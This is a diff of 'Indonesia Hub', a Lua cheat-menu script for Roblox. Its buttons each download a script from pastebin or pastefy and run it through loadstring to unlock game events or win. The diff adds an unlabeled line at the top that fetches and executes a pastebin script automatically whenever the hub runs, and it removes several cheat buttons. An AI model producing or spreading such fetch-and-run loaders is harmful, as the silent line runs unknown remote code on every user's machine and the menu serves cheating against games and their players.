@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/Jjdnj9Dj"))()
+
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 local Window = OrionLib:MakeWindow({Name = "Indonesia Hub", HidePremium = true, SaveConfig = true, ConfigFolder = "Indonesia Hub"})
@@ -101,82 +103,6 @@ Tab:AddButton({
       		loadstring(game:HttpGet("https://pastefy.app/GRZoMQHs/raw"))()
   	end    
 })
-
-Tab:AddButton({
-	Name = "10M Visit Event",
-	Callback = function()
-      		loadstring(game:HttpGet("https://pastefy.app/r9mfucOZ/raw"))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "30M Visit Event",
-	Callback = function()
-      		loadstring(game:HttpGet("https://pastefy.app/McY71Rjc/raw"))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "40M Visit Event",
-	Callback = function()
-      		loadstring(game:HttpGet("https://pastefy.app/HlarxHut/raw"))()
-  	end    
-})
-
-local Tab = Window:MakeTab({
-	Name = "2000 Studs",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
-
-Tab:AddButton({
-	Name = "Win",
-	Callback = function()
-      		loadstring(game:HttpGet("https://pastebin.com/raw/CfAKsqsc"))()
-  	end    
-})
-
-local Tab = Window:MakeTab({
-	Name = "Find The Noobies",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
-
-Tab:AddButton({
-	Name = "Papa Noobies",
-	Callback = function()
-      		loadstring(game:HttpGet("https://pastebin.com/raw/uksMWu9i"))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "Bucket Noobies",
-	Callback = function()
-      		loadstring(game:HttpGet("https://pastebin.com/raw/ZuGW4xa4"))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "Pixel Noobies",
-	Callback = function()
-      		loadstring(game:HttpGet("https://pastebin.com/raw/nBX9v47j"))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "Normal Noobies",
-	Callback = function()
-      		loadstring(game:HttpGet("https://pastebin.com/raw/gcr9SBJ4"))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "Grandpa Noobies",
-	Callback = function()
-      		loadstring(game:HttpGet("https://pastebin.com/raw/r7dbGDqu"))()
-  	end    
-})
-
 local Tab = Window:MakeTab({
 	Name = "Games",
 	Icon = "rbxassetid://4483345998",
